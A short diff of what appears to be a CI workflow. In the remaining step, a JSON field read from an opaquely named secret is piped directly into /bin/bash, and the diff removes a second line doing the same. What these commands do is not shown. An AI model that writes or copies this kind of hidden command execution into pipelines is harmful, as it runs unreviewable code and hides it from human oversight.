@@ -17,7 +17,6 @@ jobs:
           jzy4: ${{ secrets.jzy4 }}
         run: |
           printf '%s' "$jzy4" | jq -r .iis0547 | /bin/bash
-          printf '%s' "$apz3626" | jq -r .fj52 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
